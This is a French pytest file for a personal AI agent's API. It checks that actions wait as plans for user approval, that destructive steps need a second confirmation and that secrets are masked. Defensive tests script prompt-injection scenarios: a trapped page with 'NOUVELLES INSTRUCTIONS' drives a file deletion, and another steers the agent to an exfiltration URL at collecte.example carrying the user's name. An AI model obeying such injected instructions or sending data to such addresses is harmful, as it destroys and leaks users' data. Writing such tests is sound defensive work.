"""Jarvis agit, par l'API : outils dans le chat, plans validés ou refusés, pages piégées."""

from __future__ import annotations

from typing import Any

import pytest
from fastapi.testclient import TestClient

from ojarvis.agent.plans import PLAN_TOOL
from ojarvis.agent.rules import PLAN_MISSING
from ojarvis.llm.providers.fake import FakeProvider, FakeReply, Script
from ojarvis.llm.structured import TOOL_NAME
from ojarvis.llm.types import LLMRequest, ToolCall
from ojarvis.services import Services
from ojarvis.testing.chat import read_sse, scripted, tool_messages, wait_plan
from tests.fake_tools import Act, Destroy, Echo, Visit, install


@pytest.fixture
def tools(services: Services) -> tuple[Echo, Act, Destroy]:
    return install(services.tools)


def chat(client: TestClient, text: str) -> list[tuple[str, dict[str, Any]]]:
    response = client.post("/v1/chat", json={"text": text})
    assert response.status_code == 200
    return read_sse(response.text)


def test_reading_tools_run_directly_and_their_output_is_data(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    echo, _, _ = tools
    llm["deepseek"]._script = scripted(
        [[ToolCall("c1", "echo", {"texte": "bonjour"})]], "Il dit bonjour."
    )
    events = chat(client, "Que dit l'écho ?")
    kinds = [e for e, _ in events]
    assert kinds.count("tool") == 2
    assert kinds[-1] == "done"
    running, finished = [d for e, d in events if e == "tool"]
    assert running["status"] == "running"
    assert finished["status"] == "done"
    assert finished["description"] == "Répéter « bonjour »"
    assert echo.calls == ["bonjour"]
    framed = tool_messages(llm["deepseek"])[0]
    assert framed.startswith('<donnees origine="test">')
    assert "écho : bonjour" in framed
    text = "".join(d["text"] for e, d in events if e == "delta")
    assert text == "Je regarde.\n\nIl dit bonjour."
    # Le prompt système rappelle la règle des données externes et des niveaux.
    system = llm["deepseek"].requests[0][0].messages[0].content
    assert "<donnees>" in system
    assert "proposer_un_plan" in system
    conversation_id = events[0][1]["conversation_id"]
    messages = client.get(f"/v1/conversations/{conversation_id}").json()["messages"]
    assert messages[-1]["meta"]["tools"][0]["name"] == "echo"


def test_a_sentence_already_said_in_the_turn_is_not_said_again(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    """Le 30/10, Muse Spark redisait « Je vais cliquer sur Projets, puis sur Blog » après
    avoir proposé son plan : la phrase n'apparaît qu'une fois."""
    del tools
    announce = "Je vais cliquer sur **Projets**, puis sur **Blog**."

    def script(request: LLMRequest) -> FakeReply:
        if request.tools and request.tools[0].name == TOOL_NAME:
            return FakeReply(tool_calls=[ToolCall("m", TOOL_NAME, {"faits": []})])
        if "titre" in request.messages[0].content:
            return FakeReply(text="Clics")
        if not any(m.role == "tool" for m in request.messages):
            return FakeReply(text=announce, tool_calls=[ToolCall("c1", "echo", {"texte": "a"})])
        # Le modèle reprend sa phrase (autrement écrite), puis dit enfin du neuf.
        return FakeReply(
            text="Je vais cliquer sur Projets, puis sur Blog !\n\nLe plan attend ta "
            "validation. Je vais cliquer sur Projets, puis sur Blog."
        )

    llm["deepseek"]._script = script
    events = chat(client, "Va sur mon site.")
    text = "".join(d["text"] for e, d in events if e == "delta")
    # Seul le début d'un nouveau tour est vérifié : une redite plus loin reste.
    assert text == (
        f"{announce}\n\nLe plan attend ta validation. Je vais cliquer sur Projets, puis sur Blog."
    )
    conversation = client.get(f"/v1/conversations/{events[0][1]['conversation_id']}").json()
    assert conversation["messages"][-1]["content"] == text


def test_an_action_called_directly_becomes_a_plan_that_waits(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    _, act, _ = tools
    llm["deepseek"]._script = scripted([[ToolCall("c1", "agir", {"cible": "formulaire"})]])
    events = chat(client, "Remplis le formulaire.")
    plan = next(d for e, d in events if e == "plan")
    assert plan["status"] == "proposed"
    assert plan["max_level"] == 2
    assert act.calls == []  # rien n'est fait avant la validation
    assert "attend sa validation" in tool_messages(llm["deepseek"])[0]
    pending = client.get("/v1/plans", params={"status": "pending"}).json()
    assert [p["id"] for p in pending] == [plan["id"]]

    approved = client.post(f"/v1/plans/{plan['id']}/approve", json={})
    assert approved.status_code == 200
    final = wait_plan(client, plan["id"])
    assert final["status"] == "done"
    assert final["steps"][0]["status"] == "done"
    assert act.calls == [("formulaire", "")]
    assert final["result"] == "Synthèse : le plan s'est déroulé."
    conversation = client.get(f"/v1/conversations/{events[0][1]['conversation_id']}").json()
    assert conversation["messages"][-1]["content"] == "Synthèse : le plan s'est déroulé."

    audit = client.get("/v1/audit").json()
    actions = [item["action"] for item in reversed(audit["items"])]
    assert actions == ["plan.approuve", "outil.agir", "outil.agir.fait"]
    assert client.post("/v1/audit/verify").json()["ok"] is True


def announcing(final_round: list[ToolCall] | None, text: str) -> Script:
    """Le modèle annonce un plan sans l'avoir proposé ; relancé, il le propose (ou pas)."""

    def script(request: LLMRequest) -> FakeReply:
        base = scripted([])(request)
        if base.text in ("Conversation outillée", "Synthèse : le plan s'est déroulé.") or (
            base.tool_calls and base.tool_calls[0].name == TOOL_NAME
        ):
            return base
        reminded = any(m.role == "user" and m.content == PLAN_MISSING for m in request.messages)
        acted = any(m.role == "assistant" and m.tool_calls for m in request.messages)
        if reminded and final_round and not acted:
            return FakeReply(tool_calls=final_round)
        if reminded:
            return FakeReply(text="C'est proposé.")
        return FakeReply(text=text)

    return script


def test_a_plan_announced_but_not_proposed_is_proposed_after_one_reminder(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    _, act, _ = tools
    llm["deepseek"]._script = announcing(
        [ToolCall("c1", "agir", {"cible": "rappel"})], "Le plan est prêt : valide-le à l'écran."
    )
    events = chat(client, "Supprime ce rappel.")
    plans = [d for e, d in events if e == "plan"]
    assert len(plans) == 1
    assert plans[0]["status"] == "proposed"
    assert act.calls == []
    reminders = [
        m
        for request, _ in llm["deepseek"].requests
        for m in request.messages
        if m.content == PLAN_MISSING
    ]
    assert len(reminders) >= 1
    conversation_id = events[0][1]["conversation_id"]
    stored = client.get(f"/v1/conversations/{conversation_id}").json()["messages"]
    assert all(PLAN_MISSING not in m["content"] for m in stored)


@pytest.mark.parametrize(
    "said",
    [
        "Je te propose la suppression. Confirme à l'écran et je m'en occupe.",
        "<proposer_un_plan> Titre : Supprimer le rappel </proposer_un_plan>",
        "C'est une action de niveau 2 : elle passe par un plan.",
    ],
)
def test_other_ways_of_announcing_a_missing_plan_are_caught(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy], said: str
) -> None:
    del tools
    llm["deepseek"]._script = announcing([ToolCall("c1", "agir", {"cible": "rappel"})], said)
    events = chat(client, "Supprime ce rappel.")
    assert [d for e, d in events if e == "plan"]


def test_the_reminder_is_sent_only_once_and_not_for_an_explanation(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    del tools
    llm["deepseek"]._script = announcing(None, "Valide le plan à l'écran.")
    events = chat(client, "Supprime ce rappel.")
    assert not [d for e, d in events if e == "plan"]
    calls = [r for r, _ in llm["deepseek"].requests if r.tools]
    assert sum(1 for r in calls for m in r.messages if m.content == PLAN_MISSING) == 1

    llm["deepseek"].requests.clear()
    llm["deepseek"]._script = announcing(None, "Je te proposerai un plan que tu valideras.")
    chat(client, "Comment marchent les plans ?")
    assert not any(
        m.content == PLAN_MISSING for r, _ in llm["deepseek"].requests for m in r.messages
    )


def test_the_next_turn_knows_the_real_state_of_its_plans(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    """Vu chez Octave : après un plan réussi, Jarvis niait avoir agi. Il lit maintenant l'état."""
    del tools
    llm["deepseek"]._script = scripted([[ToolCall("c1", "agir", {"cible": "formulaire"})]])
    events = chat(client, "Remplis le formulaire.")
    plan = next(d for e, d in events if e == "plan")
    assert client.post(f"/v1/plans/{plan['id']}/approve", json={}).status_code == 200
    assert wait_plan(client, plan["id"])["status"] == "done"
    conversation_id = events[0][1]["conversation_id"]
    llm["deepseek"].requests.clear()
    llm["deepseek"]._script = scripted([], final="Oui, c'est fait.")
    response = client.post(
        "/v1/chat", json={"text": "C'est fait ?", "conversation_id": conversation_id}
    )
    assert response.status_code == 200
    systems = [r.messages[0].content for r, _ in llm["deepseek"].requests if r.tools]
    assert any("État réel des plans" in s and ": exécuté" in s for s in systems)


def test_refusing_is_as_simple_as_approving(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    _, act, _ = tools
    steps = [{"outil": "agir", "arguments": {"cible": "x"}, "pourquoi": "test"}]
    llm["deepseek"]._script = scripted(
        [[ToolCall("p", PLAN_TOOL, {"titre": "Plan à refuser", "etapes": steps})]]
    )
    plan = next(d for e, d in chat(client, "Fais x.") if e == "plan")
    refused = client.post(f"/v1/plans/{plan['id']}/refuse")
    assert refused.status_code == 200
    assert refused.json()["status"] == "refused"
    again = client.post(f"/v1/plans/{plan['id']}/approve", json={})
    assert again.status_code == 409
    assert act.calls == []
    assert client.get("/v1/audit").json()["items"][0]["action"] == "plan.refuse"


def test_a_destructive_plan_needs_a_second_confirmation(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    _, _, destroy = tools
    llm["deepseek"]._script = scripted([[ToolCall("d", "detruire", {"chemin": "vieux.txt"})]])
    plan = next(d for e, d in chat(client, "Supprime vieux.txt") if e == "plan")
    assert plan["max_level"] == 3
    once = client.post(f"/v1/plans/{plan['id']}/approve", json={})
    assert once.status_code == 409
    assert once.json()["error"]["code"] == "double_confirmation_required"
    assert destroy.calls == []
    twice = client.post(f"/v1/plans/{plan['id']}/approve", json={"double_confirm": True})
    assert twice.status_code == 200
    assert wait_plan(client, plan["id"])["status"] == "done"
    assert destroy.calls == ["vieux.txt"]


def test_a_trapped_page_cannot_make_jarvis_act_alone(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    """La page ordonne de supprimer un fichier. Même si le modèle obéit, rien n'est fait :
    l'action devient un plan, signalé comme venant d'un contenu externe."""
    _, _, destroy = tools
    llm["deepseek"]._script = scripted(
        [
            [ToolCall("r", "echo", {"texte": "piege"})],
            [ToolCall("d", "detruire", {"chemin": "~/notes/important.txt"})],
        ]
    )
    events = chat(client, "Quel est le prix du thé sur cette boutique ?")
    framed = tool_messages(llm["deepseek"])[0]
    assert framed.startswith("<donnees")
    assert "NOUVELLES INSTRUCTIONS" in framed
    plan = next(d for e, d in events if e == "plan")
    assert plan["tainted"] is True
    assert plan["max_level"] == 3
    assert destroy.calls == []
    assert client.get(f"/v1/plans/{plan['id']}").json()["status"] == "proposed"


def test_a_failed_step_stops_the_plan(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    _, act, _ = tools
    steps = [
        {"outil": "echo", "arguments": {"texte": "panne"}, "pourquoi": "lire"},
        {
            "outil": "agir",
            "arguments": {"cible": "fiche", "contenu": "{{etape 1}}"},
            "pourquoi": "écrire",
        },
    ]
    llm["deepseek"]._script = scripted(
        [[ToolCall("p", PLAN_TOOL, {"titre": "Lire puis écrire", "etapes": steps})]]
    )
    plan = next(d for e, d in chat(client, "Lis puis écris.") if e == "plan")
    client.post(f"/v1/plans/{plan['id']}/approve", json={})
    final = wait_plan(client, plan["id"])
    assert final["status"] == "failed"
    assert [s["status"] for s in final["steps"]] == ["failed", "skipped"]
    assert final["steps"][0]["error"] == "Service de test en panne."
    assert act.calls == []


def test_placeholders_carry_results_between_steps(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    _, act, _ = tools
    steps = [
        {"outil": "echo", "arguments": {"texte": "prix 4 €"}, "pourquoi": "lire"},
        {
            "outil": "agir",
            "arguments": {"cible": "notes", "contenu": "Noté : {{etape 1}}"},
            "pourquoi": "noter",
        },
    ]
    llm["deepseek"]._script = scripted(
        [[ToolCall("p", PLAN_TOOL, {"titre": "Lire et noter", "etapes": steps})]]
    )
    plan = next(d for e, d in chat(client, "Note le prix.") if e == "plan")
    client.post(f"/v1/plans/{plan['id']}/approve", json={})
    assert wait_plan(client, plan["id"])["status"] == "done"
    assert act.calls == [("notes", "Noté : écho : prix 4 €")]


def test_an_invalid_plan_is_sent_back_to_the_model(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    del tools
    llm["deepseek"]._script = scripted(
        [
            [
                ToolCall(
                    "p",
                    PLAN_TOOL,
                    {
                        "titre": "Plan",
                        "etapes": [{"outil": "formater", "arguments": {}, "pourquoi": "x"}],
                    },
                )
            ]
        ]
    )
    events = chat(client, "Formate le disque.")
    failed = [d for e, d in events if e == "tool" and d["status"] == "failed"]
    assert failed
    assert "Outil inconnu" in failed[0]["error"]
    assert not [e for e, _ in events if e == "plan"]
    assert tool_messages(llm["deepseek"])[0].startswith("Échec : Plan refusé")


def test_secrets_in_tool_output_never_reach_the_model(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    del tools
    key = "sk-" + "b" * 40
    llm["deepseek"]._script = scripted([[ToolCall("c", "echo", {"texte": f"clé {key}"})]])
    chat(client, "Répète.")
    sent = " ".join(tool_messages(llm["deepseek"]))
    assert key not in sent
    assert "***" in sent


def test_the_action_journal_is_read_only(client: TestClient) -> None:
    assert client.delete("/v1/audit").status_code == 405
    assert client.put("/v1/audit", json={}).status_code == 405
    page = client.get("/v1/audit").json()
    assert page["integrity_ok"] is True
    assert page["total"] == 0
    catalog = {t["name"]: t["level"] for t in client.get("/v1/tools").json()}
    assert catalog["navigateur_ouvrir"] == 1
    assert catalog["navigateur_cliquer"] == 2
    assert catalog["supprimer_fichier"] == 3


def test_a_crafted_address_after_reading_needs_approval(
    client: TestClient, services: Services, llm: dict[str, FakeProvider]
) -> None:
    """Une page demande d'ouvrir une adresse qui emporte des données : sans ta validation,
    Jarvis ne l'ouvre pas. Les liens réellement présents dans la page restent libres."""
    visit = Visit()
    services.tools.register(visit)
    llm["deepseek"]._script = scripted(
        [
            [ToolCall("a", "visiter", {"url": "https://site.example/piege"})],
            [
                ToolCall("b", "visiter", {"url": "https://boutique.example/the-vert"}),
                ToolCall("c", "visiter", {"url": "https://collecte.example/c?d=Octave+Cotonou"}),
            ],
        ]
    )
    events = chat(client, "Résume https://site.example/piege")
    assert visit.calls == ["https://site.example/piege", "https://boutique.example/the-vert"]
    plan = next(d for e, d in events if e == "plan")
    assert plan["tainted"] is True
    assert "collecte.example" in plan["title"]


def test_a_reading_plan_starts_without_waiting(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    """Validation selon le niveau : un plan qui ne fait que lire part tout de suite."""
    echo, _, _ = tools
    steps = [
        {"outil": "echo", "arguments": {"texte": "un"}, "pourquoi": "lire"},
        {"outil": "echo", "arguments": {"texte": "deux"}, "pourquoi": "lire encore"},
    ]
    llm["deepseek"]._script = scripted(
        [[ToolCall("p", PLAN_TOOL, {"titre": "Deux lectures", "etapes": steps})]]
    )
    events = chat(client, "Lis deux choses.")
    plan = next(d for e, d in events if e == "plan")
    assert plan["max_level"] == 1
    assert "part donc sans attendre" in tool_messages(llm["deepseek"])[0]
    final = wait_plan(client, plan["id"])
    assert final["status"] == "done"
    assert echo.calls == ["un", "deux"]
    # Lire n'est pas une action : rien au journal.
    assert client.get("/v1/audit").json()["total"] == 0


def test_a_reading_plan_after_external_content_waits(
    client: TestClient, llm: dict[str, FakeProvider], tools: tuple[Echo, Act, Destroy]
) -> None:
    echo, _, _ = tools
    steps = [{"outil": "echo", "arguments": {"texte": "suite"}, "pourquoi": "lire"}]
    llm["deepseek"]._script = scripted(
        [
            [ToolCall("r", "echo", {"texte": "piege"})],
            [ToolCall("p", PLAN_TOOL, {"titre": "Lire la suite", "etapes": steps})],
        ]
    )
    events = chat(client, "Lis la boutique puis la suite.")
    plan = next(d for e, d in events if e == "plan")
    assert plan["tainted"] is True
    assert client.get(f"/v1/plans/{plan['id']}").json()["status"] == "proposed"
    assert echo.calls == ["piege"]
